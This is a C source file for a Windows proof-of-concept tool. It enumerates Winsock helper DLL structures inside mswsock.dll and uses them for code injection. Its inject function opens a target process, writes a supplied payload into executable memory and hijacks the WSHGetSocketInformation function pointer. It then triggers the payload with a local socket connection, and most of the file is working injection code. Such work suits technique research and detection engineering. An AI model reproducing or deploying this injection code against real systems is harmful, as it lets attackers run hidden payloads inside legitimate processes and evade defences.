/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <versionhelpers.h>

#include "../ntlib/util.h"
#include "wsh.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")

typedef struct _SOCK_HELPER_DLL_T {
    PWCHAR file;
    PWCHAR guid;
    PWCHAR description;
} SOCK_HELPER_DLL, *PSOCK_HELPER_DLL;

// there are many sock helper DLLs, but these are all that were 
// found in the registry for an evaluation copy of Windows 10
SOCK_HELPER_DLL helperList[]={
  { L"wshunix.dll",   L"{A00943D9-9C2E-4633-9B59-0057A3160994}", L"UNIX socket address family"},
  { L"wshtcpip.dll",  L"{E70F1AA0-AB8B-11CF-8CA3-00805F48A192}", L"Winsock2 Helper DLL (TL/IPv4)"},
  { L"wship6.dll",    L"{F9EAB0C0-26D4-11D0-BBBF-00AA006C34E4}", L"Winsock2 Helper DLL (TL/IPv6)"},
  { L"wshqos.dll",    L"{9D60A9E0-337A-11D0-BD88-0000C082E69A}", L"QoS Winsock2 Helper DLL"},
  { L"wshhyperv.dll", L"{1234191B-4BF7-4CA7-86E0-DFD7C32B5445}", L"Hyper-V Winsock2 Helper DLL"},
  { L"wshirda.dll",   L"{3972523D-2AF1-11D1-B655-00805F3642CC}", L"IrDA Winsock Helper DLL"},
  { NULL, NULL, NULL}
};

typedef struct _PROCENTRY_T {
    DWORD      id;                // unique id
    WCHAR      name[MAX_PATH];    // name of process
    LPVOID     mswsock;           // base address of wswsock.dll
    DWORD      cnt;               // count of ports listening
    WORD       ports[65535];      // listening port
    DWORD      addrs[65535];      // local address for each port
} PROCENTRY, *PPROCENTRY;

typedef struct _WSHINFO_T {
    DWORD      rva;               // relative virtual address of SockHelperDllListHead
    DWORD      cnt;               // number of PROCENTRY
    DWORD      plen;              // cnt * sizeof(PROCENTRY)
    PPROCENTRY plist;             // array of PROCENTRY structures
} WSHINFO, *PWSHINFO;
  
// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// returns TRUE if ptr is heap
BOOL IsHeapPtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_PRIVATE   ) && 
            (mbi.Protect == PAGE_READWRITE));
}

// returns TRUE if ptr is RX code
BOOL IsCodePtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_EXECUTE_READ));
}

// calculate the RVA of Socket Helpder DLL LIST_ENTRY in MSWSOCK data section
DWORD GetSockHelperDllListHeadRVA(VOID) {
    WSADATA                  wsa;
    SOCKET                   s;
    LPVOID                   m;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    res, rva=0, i, j;
    PULONG_PTR               le;
    MEMORY_BASIC_INFORMATION mbi;
    PWINSOCK_HELPER_DLL_INFO hdi;
    
    // by creating a socket for AF_INET, 
    // this loads mswsock.dll and initializes SockHelperDllListHead
    WSAStartup(MAKEWORD(2, 0), &wsa);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    closesocket(s);
    
    m = GetModuleHandle(L"mswsock.dll");
    
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
            
    // get the .data segment
    for(i=0; i<nt->FileHeader.NumberOfSections; i++)
      if(*(DWORD*)sh[i].Name == *(DWORD*)".data") break;
      
    if(i < nt->FileHeader.NumberOfSections) {
      // scan section for LIST_ENTRY structures
      le = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
         
      for(j=0; j<(sh[i].Misc.VirtualSize/sizeof(ULONG_PTR)); j++) {
        PLIST_ENTRY list = (PLIST_ENTRY)&le[j];
        
        // skip it not equal
        if(list->Flink != list->Blink) continue;
        
        // skip if not heap
        if(!IsHeapPtr(list->Flink) && !IsHeapPtr(list->Blink)) continue;
        
        // assume it's a winsock helpder dll info structure
        hdi = (PWINSOCK_HELPER_DLL_INFO)list->Flink;
        
        // if heap/code pointers are present
        if(IsHeapPtr(hdi->Mapping)        &&
           IsCodePtr(hdi->WSHOpenSocket)  && 
           IsCodePtr(hdi->WSHOpenSocket2) &&
           IsCodePtr(hdi->WSHIoctl)) {
           // return the RVA
           rva = sh[i].VirtualAddress + j * sizeof(ULONG_PTR);
           break;
        }
      }
    }
    return rva;
}

// return base address of DLL in remote process
LPVOID GetRemoteModuleHandle(DWORD pid, LPCWSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

// add process, local port and address to existing entry or create new one
BOOL AddProcessToList(WSHINFO *wsh, DWORD id, DWORD addr, DWORD port) {
    PPROCENTRY pe = NULL;
    DWORD      i;
    
    // first call? create list and set RVA
    if(wsh->plist == NULL) {
      wsh->cnt   = 0;        // number of process entries
      wsh->plen  = sizeof(PROCENTRY);
      wsh->plist = malloc(sizeof(PROCENTRY));

      if(wsh->plist == NULL) return FALSE;
      // zero initialize entry
      memset(wsh->plist, 0, sizeof(PROCENTRY));
      // read the RVA for SockHelperDllListHead
      wsh->rva = GetSockHelperDllListHeadRVA();
    }
    // search list for existing entry
    for(i=0; i<wsh->cnt; i++) {
      // found match?
      if(wsh->plist[i].id == id) {
        pe = &wsh->plist[i];
        break;
      }
    }
    // if found, add port + addr
    if(pe != NULL) {
      pe->ports[pe->cnt] = port;
      pe->addrs[pe->cnt] = addr;
      pe->cnt++;
      
      return TRUE;
    }
    pe = &wsh->plist[wsh->cnt];
    // set pid, process name and base of mswsock.dll
    pe->id  = id;
    pe->cnt = 1;
    pe->ports[0] = port;
    pe->addrs[0] = addr;
    pe->mswsock = GetRemoteModuleHandle(id, L"mswsock.dll");
    lstrcpy(pe->name, pid2name(id));
    // create new entry
    wsh->plen += sizeof(PROCENTRY);
    wsh->plist = realloc(wsh->plist, wsh->plen);
    wsh->cnt++;
    
    return TRUE;
}

DWORD GetProcessList(PWSHINFO wsh, BOOL bOpen) {
    DWORD                   plen;
    PPROCENTRY              plist;
    HANDLE                  hp;
    PMIB_TCPTABLE_OWNER_PID tbl;
    DWORD                   err, len, i;
    
    // obtain a list of listening ports and their process ids
    tbl = NULL;
    len = 0;
    // read the size of table
    err = GetExtendedTcpTable(tbl, &len, 
        TRUE, AF_INET, TCP_TABLE_OWNER_PID_LISTENER, 0);
        
    if(err != ERROR_INSUFFICIENT_BUFFER) return 0;
    
    // allocate sufficient buffer
    tbl = (PMIB_TCPTABLE_OWNER_PID)malloc(len);
    if(tbl != NULL) {
      // read the table
      err = GetExtendedTcpTable(tbl, &len, 
        TRUE, AF_INET, TCP_TABLE_OWNER_PID_LISTENER, 0);
    }
    
    if(err == NO_ERROR) {
      // for each entry
      for(i=0; i<tbl->dwNumEntries; i++) {
        if(tbl->table[i].dwLocalAddr == INADDR_ANY) {
          // try open process for reading+writing VM
          if(bOpen) {
            hp = OpenProcess(PROCESS_ALL_ACCESS, 
              FALSE, tbl->table[i].dwOwningPid);
            CloseHandle(hp);
            if(hp == NULL) continue;
          }
          // add this process or port to list
          AddProcessToList(
            wsh, 
            tbl->table[i].dwOwningPid, 
            tbl->table[i].dwLocalAddr, 
            tbl->table[i].dwLocalPort);
        }
      }
    }
    return wsh->cnt;
}

PWCHAR guid2name(PWCHAR guid) {
    DWORD i;
    PWCHAR str = L"Unknown";
    
    for(i=0; helperList[i].file != NULL; i++) {
      if(lstrcmpi(helperList[i].guid, guid) == 0) {
        str = helperList[i].description;
        break;
      }
    }
    return str;
}

// resolve symbol for addr without using SymFromName
PWCHAR addr2sym(HANDLE hp, LPVOID addr) {
    WCHAR        path[MAX_PATH];
    BYTE         buf[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO si=(PSYMBOL_INFO)buf;
    static WCHAR name[MAX_PATH];
    
    ZeroMemory(path, ARRAYSIZE(path));
    ZeroMemory(name, ARRAYSIZE(name));
          
    GetMappedFileName(
      hp, addr, path, MAX_PATH);
    
    PathStripPath(path);
    
    si->SizeOfStruct = sizeof(SYMBOL_INFO);
    si->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
      wsprintf(name, L"%s!%hs", path, si->Name);
    } else {
      lstrcpy(name, path);
    }
    return name;
}
          
// list WINSOCK_HELPER_DLL_INFO for pid
VOID ListWSHX(DWORD pid) {
    HANDLE                  hp;
    LPVOID                  mswsock, ptr;
    DWORD                   rva, i;
    SIZE_T                  rd;
    BOOL                    bRead;
    LIST_ENTRY              le;
    WINSOCK_HELPER_DLL_INFO hdi;
    OLECHAR                 guid[MAX_PATH];
    
    // get base address of mswsock.dll in remote process
    mswsock = GetRemoteModuleHandle(pid, L"mswsock.dll");
    
    if(mswsock == NULL) {
      printf("Windows Service Provider not found for process : %i.\n", pid);
      return;
    }
    
    // get the rva of SockHelperDllListHead
    rva = GetSockHelperDllListHeadRVA();

    if(rva == 0) {
      printf("Unable to obtain RVA for SockHelperDllListHead.\n");
      return;
    }
    
    printf("\n\nSockHelperDllListHead   : %p", (LPBYTE)mswsock + rva);

    // try to open the remote process
    hp = OpenProcess(
      PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      printf("Unable to open process : %i\n", pid);
      return;
    }
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    // read SockHelperDllListHead
    ReadProcessMemory(
      hp, (LPBYTE)mswsock + rva, 
      &le, sizeof(LIST_ENTRY), &rd);
      
    ptr = le.Flink;
    
    // for each WINSOCK_HELPER_DLL_INFO
    for(;;) {
      // read entry
      bRead = ReadProcessMemory(
        hp, (LPVOID)ptr, &hdi, 
        sizeof(WINSOCK_HELPER_DLL_INFO), &rd);
      
      // if not read, break
      if(!bRead || rd != sizeof(WINSOCK_HELPER_DLL_INFO)) break;
      
      // show information
      printf("\n\n");
      printf("Unknown                 : %i\n",   hdi.Unknown);
      printf("DllHandle               : %p : %ws\n", 
        (LPVOID)hdi.DllHandle, addr2sym(hp, hdi.DllHandle));
      
      printf("MinSockaddrLength       : %i\n",   hdi.MinSockaddrLength);
      printf("MaxSockaddrLength       : %i\n",   hdi.MaxSockaddrLength);
      printf("MinTdiAddressLength     : %i\n",   hdi.MinTdiAddressLength);
      printf("MaxTdiAddressLength     : %i\n",   hdi.MaxTdiAddressLength);
      printf("UseDelayedAcceptance    : %lX\n",  hdi.UseDelayedAcceptance);
      printf("Mapping                 : %p\n",   (LPVOID)hdi.Mapping);
      
      if(StringFromGUID2(&hdi.ProviderGUID, guid, MAX_PATH)) {
        printf("ProviderGUID            : %ws : (%ws)\n", guid, guid2name(guid));
      }
      
      printf("WSHOpenSocket           : %p : %ws\n",   
        hdi.WSHOpenSocket,  addr2sym(hp, hdi.WSHOpenSocket));
      
      printf("WSHOpenSocket2          : %p : %ws\n",   
        hdi.WSHOpenSocket2, addr2sym(hp, hdi.WSHOpenSocket2));
      
      printf("WSHJoinLeaf             : %p : %ws\n",   
        hdi.WSHJoinLeaf, addr2sym(hp, hdi.WSHJoinLeaf));
        
      printf("WSHNotify               : %p : %ws\n",   
        hdi.WSHNotify, addr2sym(hp, hdi.WSHNotify));
        
      printf("WSHGetSocketInformation : %p : %ws\n",   
        hdi.WSHGetSocketInformation, addr2sym(hp, hdi.WSHGetSocketInformation));
        
      printf("WSHSetSocketInformation : %p : %ws\n",   
        hdi.WSHSetSocketInformation, addr2sym(hp, hdi.WSHSetSocketInformation));
        
      printf("WSHGetSockaddrType      : %p : %ws\n",   
        hdi.WSHGetSockaddrType, addr2sym(hp, hdi.WSHGetSockaddrType));
        
      printf("WSHGetWildcardSockaddr  : %p : %ws\n",   
        hdi.WSHGetWildcardSockaddr, addr2sym(hp, hdi.WSHGetWildcardSockaddr));
        
      printf("WSHGetBroadcastSockaddr : %p : %ws\n",   
        hdi.WSHGetBroadcastSockaddr, addr2sym(hp, hdi.WSHGetBroadcastSockaddr));
        
      printf("WSHAddressToString      : %p : %ws\n",   
        hdi.WSHAddressToString, addr2sym(hp, hdi.WSHAddressToString));
        
      printf("WSHStringToAddress      : %p : %ws\n",   
        hdi.WSHStringToAddress, addr2sym(hp, hdi.WSHStringToAddress));
        
      printf("WSHIoctl                : %p : %ws\n",   
        hdi.WSHIoctl, addr2sym(hp,hdi.WSHIoctl));
    
      // finished? break
      ptr = hdi.HelperDllListEntry.Flink;
      if(ptr == (LPBYTE)mswsock + rva) break;
    }
    SymCleanup(hp);
    CloseHandle(hp);
}

// list transports and their provider GUID, DLL path
VOID ListTransports(VOID) {
    HKEY    hk;
    LSTATUS ls;
    WCHAR   *p, tp[MAX_PATH], rk[MAX_PATH], dll[MAX_PATH], path[MAX_PATH];
    DWORD   tplen, len, type;
    GUID    prov;
    OLECHAR guid[MAX_PATH];
    
    ZeroMemory(tp, ARRAYSIZE(tp));
    
    // open key to read transports available
    ls = RegOpenKeyEx(
      HKEY_LOCAL_MACHINE, 
      L"SYSTEM\\CurrentControlSet\\Services\\Winsock\\Parameters",
      0, KEY_READ, &hk);
      
    if(ls == ERROR_SUCCESS) {
      // read the value of Transports subkey
      tplen = MAX_PATH;
      ls = RegQueryValueEx(hk, L"Transports", NULL, NULL, (LPBYTE)tp, &tplen);
      
      RegCloseKey(hk);
    }
    
    // if we were able to read something
    if(tp[0] != 0) {
      for(p=tp;;) {
        printf("\n");
        // get the length of transport name
        tplen = lstrlen(p);
        // end of list? break
        if(tplen == 0) break;
        // format root key
        wsprintf(rk, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters\\Winsock", p);
        p += tplen + 1;
        // try open it
        ls = RegOpenKeyEx(
          HKEY_LOCAL_MACHINE,
          rk, 0, KEY_READ, &hk);
          
        if(ls == ERROR_SUCCESS) {
          // read the HelperDllName
          len = MAX_PATH;
          ls = RegQueryValueEx(hk, L"HelperDllName", NULL, NULL, (LPBYTE)dll, &len);
          
          if(ls == ERROR_SUCCESS) {
            if(ExpandEnvironmentStrings(dll, path, MAX_PATH) != 0) {
              printf("HelperDllName : %ws\n", path);
              
              // read the ProviderGUID
              len = sizeof(GUID);
              ls = RegQueryValueEx(hk, L"ProviderGUID", NULL, NULL, (LPBYTE)&prov, &len);
              if(ls == ERROR_SUCCESS) {
                if(StringFromGUID2(&prov, guid, MAX_PATH)) {
                  printf("ProviderGUID  : %ws\n", guid);
                }
              }
            }
          }
          RegCloseKey(hk);
        }
      }
    }
}

// list WINSOCK_HELPER_DLL_INFO for pid
LPVOID GetHelperDLLInfo(HANDLE hp, DWORD pid, PWINSOCK_HELPER_DLL_INFO hdi) {
    LPVOID     mswsock, ptr, addr = NULL;
    DWORD      rva, i;
    SIZE_T     rd;
    BOOL       bRead;
    LIST_ENTRY le;
    GUID       guid;
    
    // convert the TCP/IPv4 provider GUID to binary
    CLSIDFromString(L"{E70F1AA0-AB8B-11CF-8CA3-00805F48A192}", &guid);
    
    // get base address of mswsock.dll in remote process
    mswsock = GetRemoteModuleHandle(pid, L"mswsock.dll");
    
    if(mswsock == NULL) return NULL;
    
    // get the rva of SockHelperDllListHead
    rva = GetSockHelperDllListHeadRVA();
    
    if(rva == 0) return NULL;
    
    // read SockHelperDllListHead
    ReadProcessMemory(
      hp, (LPBYTE)mswsock + rva, 
      &le, sizeof(LIST_ENTRY), &rd);
      
    ptr = le.Flink;
    
    // for each WINSOCK_HELPER_DLL_INFO
    for(;;) {
      // read entry
      bRead = ReadProcessMemory(
        hp, (LPVOID)ptr, hdi, 
        sizeof(WINSOCK_HELPER_DLL_INFO), &rd);
      
      // if not read, break
      if(!bRead || rd != sizeof(WINSOCK_HELPER_DLL_INFO)) break;
    
      // if this is the TCP/IPv4 provider, return TRUE
      if(memcmp(&hdi->ProviderGUID, &guid, sizeof(GUID)) == 0) {
        addr = ptr;
        break;
      }
      
      // finished? break
      ptr = hdi->HelperDllListEntry.Flink;
      if(ptr == (LPBYTE)mswsock + rva) break;
    }
    return addr;
}

VOID inject(DWORD pid, WORD port, LPVOID payload, DWORD payloadSize) {
    DWORD                   rva, r;
    HANDLE                  hp;
    WINSOCK_HELPER_DLL_INFO hdi;
    LPVOID                  cs, addr;
    SIZE_T                  wr;
    SOCKET                  s;
    struct sockaddr_in      sin;
    
    // 1. Try open process for reading/writing VM
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      printf("Unable to open PID : %i\n", pid);
      return;
    }
    
    // 2. Get helper DLL entry for TCP v4
    addr = GetHelperDLLInfo(hp, pid, &hdi);
    
    if(addr != NULL) {
      // 3. Create a windows socket and write the payload to remote process
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      
      cs = VirtualAllocEx(hp, NULL, payloadSize,
          MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if(cs != NULL) {
        if(WriteProcessMemory(hp, cs, payload, payloadSize, &wr)) {
      
          // 4. Update the function pointer with pointer to payload
          if(WriteProcessMemory(
            hp, 
            (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
            &cs,
            sizeof(ULONG_PTR), 
            &wr)) 
          {
            // 5. Trigger it with connection to the port on localhost
            sin.sin_family      = AF_INET;
            sin.sin_port        = htons(port);
            sin.sin_addr.s_addr = inet_addr("127.0.0.1");
            
            if(connect(s, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
              printf("Injection completed.\n");              
              // wait a moment before restoring pointer
              Sleep(10);
            } else printf("Unable to connect to service.\n");
            
            // 6. Restore function pointer and clean up
            WriteProcessMemory(
              hp, 
              (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
              &hdi.WSHGetSocketInformation,
              sizeof(ULONG_PTR), 
              &wr);
          } else printf("Unable to update function pointer.\n");
        } else printf("Unable to deploy payload.\n");
        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
        closesocket(s);
      } else printf("Unable to allocate RWX memory.\n");        
    } else {
      printf("Unable to find WINSOCK_HELPER_DLL_INFO entry.\n");
    }
    CloseHandle(hp);
}

void usage(void) {
    wprintf(L"usage: wsh <process> <payload>\n");
    exit(0);
}

DWORD _RtlGetVersion(void) {
    NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osvi;
    DWORD            ver = 0;

    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandle(L"ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion) {
      osvi.dwOSVersionInfoSize = sizeof(osvi);
      RtlGetVersion(&osvi);
      ver = osvi.dwMajorVersion;
    }
    return ver;
}

int main(void) {
    DWORD         i, j, len, cnt, pid = 0, port = 0;
    WSHINFO       wsh;
    LPVOID        payload;
    int           argc;
    wchar_t       **argv;
  
    if(_RtlGetVersion() != 10) {
      printf("\nWARNING: PoC only tested on Windows 10!\n");
    }
    
    memset(&wsh, 0, sizeof(wsh));
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      printf("WARNING: could not enable debugging privilege.\n");
    }
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
  
    // if no parameters, list all available processes
    if(argc == 1) {
      ListTransports();
      cnt = GetProcessList(&wsh, TRUE);
    
      printf("\n%-15s | %-4s | %s\n", "Process", "PID", "TCP Ports");
      printf("***************************************\n");
      
      for(i=0; i<cnt; i++) {
        printf("%-15ws : %5i : ", wsh.plist[i].name, wsh.plist[i].id);
        for(j=0; j<wsh.plist[i].cnt; j++) {
          printf("%i", htons(wsh.plist[i].ports[j]));
          if((j+1) != wsh.plist[i].cnt) putchar(',');
        }
        putchar('\n');
      }
    } else if(argc == 2 || argc == 4) {
      pid = name2pid(argv[1]);
      if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
      if(pid == 0) {
        printf("ERROR: unable to resolve pid for \"%ws\".\n", argv[1]);
        return -1;
      }
    
      // if just one parameter, list WSHX structures
      if(argc == 2) {
        ListWSHX(pid);
      } else {
      // if two parameters, attempt to perform injection
        len = readpic(argv[3], &payload);
        if(len == 0) {
          printf("Unable to read %ws.\n", argv[3]);
        } else {
          port = wcstoull(argv[2], NULL, 10);
          inject(pid, port, payload, len);
        }
      }
    } else {
      printf("\nusage: wsh <process> <port> <payload>\n");
    }
    return 0;
}
